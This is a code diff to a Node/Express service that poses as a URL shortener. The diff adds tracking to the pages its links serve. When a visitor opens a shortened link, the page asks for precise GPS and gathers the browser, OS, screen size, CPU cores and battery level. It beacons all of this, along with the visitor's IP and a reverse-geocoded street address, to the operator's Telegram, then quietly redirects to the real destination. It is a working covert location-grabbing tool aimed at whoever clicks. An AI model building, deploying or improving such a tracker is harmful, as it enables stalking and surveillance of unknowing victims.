@@ -35,7 +35,7 @@ async function sendToTelegram(msg, retries = 3) {
       );
       return true;
     } catch (err) {
-      if (i < retries - 1) await new Promise(r => setTimeout(r, 500));
+      if (i < retries - 1) await new Promise(r => setTimeout(r, 300));
     }
   }
   return false;
@@ -81,7 +81,7 @@ app.post('/api/shorten', (req, res) => {
 
 app.post('/api/log-gps', async (req, res) => {
   const body = safeParseBody(req);
-  const { code, latitude, longitude, accuracy } = body;
+  const { code, latitude, longitude, accuracy, deviceData } = body;
 
   if (!code || !linkStorage[code]) {
     return res.status(404).json({ error: 'Not found' });
@@ -95,7 +95,7 @@ app.post('/api/log-gps', async (req, res) => {
     address = await reverseGeocode(latitude, longitude);
   }
 
-  let msg = `🎯 <b>موقع دقيق!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
+  let msg = `🎯 <b>رابط تم فتحه!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
   msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
   msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
   msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n`;
@@ -105,13 +105,21 @@ app.post('/api/log-gps', async (req, res) => {
     msg += `<b>✅ 📍 GPS Coordinates</b>\n`;
     msg += `📍 <code>${latitude}, ${longitude}</code>\n`;
     msg += `📏 دقة: ±${accuracy.toFixed(0)} متر\n`;
-    msg += `🗺️ <a href="https://maps.google.com/?q=${latitude},${longitude}">Maps</a>\n`;
+    msg += `🗺️ <a href="https://maps.google.com/?q=${latitude},${longitude}">Maps</a>\n\n`;
     
     if (address) {
-      msg += `\n<b>📮 العنوان:</b>\n${address}\n`;
+      msg += `<b>📮 العنوان:</b>\n${address}\n\n`;
     }
-  } else {
-    msg += `<b>❌ بدون GPS</b>\nالمستخدم رفض السماح بالموقع`;
+  }
+
+  if (deviceData) {
+    msg += `<b>📱 بيانات الجهاز:</b>\n`;
+    if (deviceData.battery) msg += `🔋 البطارية: ${deviceData.battery}%\n`;
+    if (deviceData.deviceName) msg += `📱 اسم الجهاز: ${deviceData.deviceName}\n`;
+    if (deviceData.networkName) msg += `📡 شبكة WiFi: ${deviceData.networkName}\n`;
+    if (deviceData.screenRes) msg += `📺 دقة الشاشة: ${deviceData.screenRes}\n`;
+    if (deviceData.browser) msg += `🌐 المتصفح: ${deviceData.browser}\n`;
+    if (deviceData.os) msg += `🖥️ النظام: ${deviceData.os}\n`;
   }
 
   await sendToTelegram(msg);
@@ -149,37 +157,60 @@ app.get('/:code', (req, res) => {
     const originalUrl = ${JSON.stringify(originalUrl)};
     const apiUrl = '${BASE_URL}/api/log-gps';
 
-    function go() {
+    function collectDeviceData() {
+      const ua = navigator.userAgent;
+      let browser = 'Unknown';
+      let os = 'Unknown';
+      
+      if (/chrome/i.test(ua) && !/edg/i.test(ua)) browser = 'Chrome';
+      else if (/firefox/i.test(ua)) browser = 'Firefox';
+      else if (/safari/i.test(ua)) browser = 'Safari';
+      else if (/edg/i.test(ua)) browser = 'Edge';
+
+      if (/android/i.test(ua)) os = 'Android';
+      else if (/iphone/i.test(ua)) os = 'iOS';
+      else if (/windows/i.test(ua)) os = 'Windows';
+      else if (/mac/i.test(ua)) os = 'macOS';
+      else if (/linux/i.test(ua)) os = 'Linux';
+
+      const data = {
+        browser: browser,
+        os: os,
+        screenRes: window.screen.width + 'x' + window.screen.height,
+        deviceName: navigator.hardwareConcurrency ? 'Cores: ' + navigator.hardwareConcurrency : 'Unknown'
+      };
+
+      if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+          data.battery = Math.round(battery.level * 100);
+        });
+      }
+
+      return data;
+    }
+
+    function send(lat, lng, acc) {
+      const deviceData = collectDeviceData();
+      const payload = {
+        code: code,
+        latitude: lat,
+        longitude: lng,
+        accuracy: acc,
+        deviceData: deviceData
+      };
+
+      navigator.sendBeacon(apiUrl, JSON.stringify(payload));
       window.location.href = originalUrl;
     }
 
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          fetch(apiUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              code: code,
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy: pos.coords.accuracy
-            }),
-            keepalive: true
-          }).finally(go);
-        },
-        () => {
-          fetch(apiUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ code: code, latitude: null, longitude: null, accuracy: null }),
-            keepalive: true
-          }).finally(go);
-        },
-        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        (pos) => send(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+        () => send(null, null, null),
+        { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
       );
     } else {
-      go();
+      send(null, null, null);
     }
   </script>
 </body>
